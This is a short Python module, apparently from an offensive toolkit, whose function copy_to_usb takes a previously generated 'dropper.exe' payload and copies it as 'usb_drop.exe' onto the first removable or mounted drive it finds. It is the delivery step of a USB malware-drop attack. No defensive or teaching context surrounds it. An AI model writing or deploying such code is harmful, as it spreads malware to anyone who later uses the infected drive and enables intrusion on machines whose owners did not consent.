import os
import shutil
import psutil
from app.core.utils import setup_output_directory

def copy_to_usb():
    output_dir = setup_output_directory()
    payload_path = os.path.join(output_dir, "dropper.exe")
    
    if not os.path.exists(payload_path):
        return False, "Payload not found. Generate it first."

    usb_found = False
    destination_path = ""
    
    for partition in psutil.disk_partitions():
        if "removable" in partition.opts or "/media" in partition.mountpoint or "/run/media" in partition.mountpoint:
            usb_path = partition.mountpoint
            usb_found = True
            destination_path = os.path.join(usb_path, "usb_drop.exe")
            try:
                shutil.copy(payload_path, destination_path)
                return True, destination_path
            except Exception as e:
                return False, str(e)
            
    if not usb_found:
        return False, "No USB drive detected."
    
    return False, "Unknown error."
